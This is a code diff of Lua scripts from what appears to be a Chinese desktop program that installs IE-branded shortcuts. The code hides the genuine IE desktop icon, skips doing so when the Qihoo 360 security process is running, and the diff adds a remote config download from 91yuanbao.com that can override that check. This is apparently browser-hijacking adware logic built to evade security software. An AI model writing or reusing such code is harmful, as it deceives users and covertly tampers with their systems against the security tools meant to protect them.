@@ -499,17 +499,17 @@ function TryInstallIE()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
 	local nValue = FunctionObj.RegQueryValue(strRegFSPath)
-	if IsNilString(nValue) then
-		return   --不是首次启动
+	if IsNilString(nValue) then 
+		return   --不是首次启动 
 	end
 	
 	local strRegIEPath = "HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path"
 	local strIEPath = FunctionObj.RegQueryValue(strRegIEPath)
 	if IsRealString(strIEPath) then
-		return --已经安装
+		return --已经安装  
 	end
 	if not tipUtil:QueryFileExists(GetIEPath()) then
-		return
+		return   
 	end
 	DoInstallIE()
 	FunctionObj.RegDeleteValue(strRegFSPath)
@@ -595,7 +595,8 @@ end
 
 
 function WriteIEShortCut()
-	HideIEIco()
+	CheckNeedHideICO(HideIEIco)
+	
 	WriteStartMenuSC()
 	WriteStartMenuProgramSC()
 	WriteQuickLaunchSC()
@@ -625,11 +626,53 @@ function CopyBackUpLnk(strSourcePath,strNamePreFix)
 	tipUtil:DeletePathFile(strSourcePath)
 end
 
-function HideIEIco()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 
-	local bExists = tipUtil:QueryProcessExists("360tray.exe")
-	if bExists then
+function CheckNeedHideICO(fnCallBack)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bNeedHideICO = true
+
+	function DoDefaultOperation()
+		local bExists = tipUtil:QueryProcessExists("360tray.exe")
+		if bExists then
+			fnCallBack(not bNeedHideICO)
+		else
+			fnCallBack(bNeedHideICO)
+		end
+	end
+	
+	local strURL = "http://www.91yuanbao.com/cmi/iesetupconfig.js"
+	local strSysTempDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSysTempDir, "iesetupconfig.js")
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strURL..strStamp
+	
+	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false, 
+		function(bRet, strIniPath)
+			FunctionObj.TipLog("[CheckNeedHideICO] NewAsynGetHttpFile bRet : "..tostring(bRet)
+								.."  strSavePath: "..tostring(strSavePath))
+		
+			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
+				DoDefaultOperation()
+				return 
+			end
+			
+			local nIgnore360, bRet = tipUtil:ReadINI(strIniPath, "entryaction", "desktop")
+			if not bRet or tostring(nIgnore360) ~= "0" then
+				DoDefaultOperation()
+				return
+			end
+			
+			fnCallBack(bNeedHideICO)
+			
+		end, 10*1000)
+end
+
+
+function HideIEIco(bNeedHide)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	
+	if not bNeedHide then
 		return
 	end
 	
